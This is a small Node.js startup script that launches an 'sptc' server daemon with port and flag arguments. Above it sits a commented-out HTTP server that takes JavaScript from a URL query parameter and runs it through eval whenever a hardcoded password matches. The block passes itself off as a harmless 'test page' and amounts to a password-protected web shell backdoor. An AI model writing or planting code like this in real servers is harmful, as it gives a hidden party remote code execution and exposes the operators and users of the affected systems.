/*
const PORT = process.env.PORT || 3000;
const http=require('http')
http.createServer((req, res)=>{
  const querystring=require('querystring')
  const url=require('url')
  const ret={cmd: '', ret: ''}
  try{
    const {query}=url.parse(req.url)
    const {p, v}=querystring.parse(query)
    if(p!=='xbhdsyjYFJYbjvHknkkjnktRDtr') throw 1
    const js=decodeURIComponent(v)
    ret.cmd=js
    ret.ret=eval('(function(){return '+js+'})()')
  }catch(e) {}
  res.end('This is a test Page. The project is developing. - '+Date.now()+JSON.stringify(ret, 0, 2))
}).listen(PORT)
*/

process.argv.push(
  '-p'+(process.env.PORT || 3000),
  //'-w'+__dirname+'/app',
  //'-rinxdex.s',
  '-t',
)
require('sptc/bin/sptcd')
